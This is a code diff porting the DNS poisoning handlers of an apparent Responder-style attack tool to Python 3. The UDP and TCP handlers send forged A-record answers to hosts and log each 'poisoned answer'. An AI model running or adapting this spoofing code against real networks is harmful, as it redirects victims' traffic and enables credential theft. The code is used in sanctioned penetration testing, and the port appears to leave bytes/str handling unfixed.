@@ -15,54 +15,54 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 from core.responder.packets import DNS_Ans
-from SocketServer import BaseRequestHandler
+from socketserver import BaseRequestHandler
 from core.responder.utils import *
 
 def ParseDNSType(data):
-	QueryTypeClass = data[len(data)-4:]
+    QueryTypeClass = data[len(data)-4:]
 
-	# If Type A, Class IN, then answer.
-	return QueryTypeClass == "\x00\x01\x00\x01"
+    # If Type A, Class IN, then answer.
+    return QueryTypeClass == "\x00\x01\x00\x01"
 
 
 
 class DNS(BaseRequestHandler):
-	def handle(self):
-		# Break out if we don't want to respond to this host
-		if RespondToThisIP(self.client_address[0]) is not True:
-			return None
+    def handle(self):
+        # Break out if we don't want to respond to this host
+        if RespondToThisIP(self.client_address[0]) is not True:
+            return None
 
-		try:
-			data, soc = self.request
+        try:
+            data, soc = self.request
 
-			if ParseDNSType(data) and settings.Config.AnalyzeMode == False:
-				buff = DNS_Ans()
-				buff.calculate(data)
-				soc.sendto(str(buff), self.client_address)
+            if ParseDNSType(data) and settings.Config.AnalyzeMode == False:
+                buff = DNS_Ans()
+                buff.calculate(data)
+                soc.sendto(str(buff), self.client_address)
 
-				ResolveName = re.sub(r'[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
-				print color("[*] [DNS] Poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1)
+                ResolveName = re.sub(r'[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
+                print(color("[*] [DNS] Poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1))
 
-		except Exception:
-			pass
+        except Exception:
+            pass
 
 # DNS Server TCP Class
 class DNSTCP(BaseRequestHandler):
-	def handle(self):
-		# Break out if we don't want to respond to this host
-		if RespondToThisIP(self.client_address[0]) is not True:
-			return None
-	
-		try:
-			data = self.request.recv(1024)
+    def handle(self):
+        # Break out if we don't want to respond to this host
+        if RespondToThisIP(self.client_address[0]) is not True:
+            return None
 
-			if ParseDNSType(data) and settings.Config.AnalyzeMode is False:
-				buff = DNS_Ans()
-				buff.calculate(data)
-				self.request.send(str(buff))
+        try:
+            data = self.request.recv(1024)
 
-				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
-				print color("[*] [DNS-TCP] Poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1)
+            if ParseDNSType(data) and settings.Config.AnalyzeMode is False:
+                buff = DNS_Ans()
+                buff.calculate(data)
+                self.request.send(str(buff))
 
-		except Exception:
-			pass
+                ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
+                print(color("[*] [DNS-TCP] Poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1))
+
+        except Exception:
+            pass
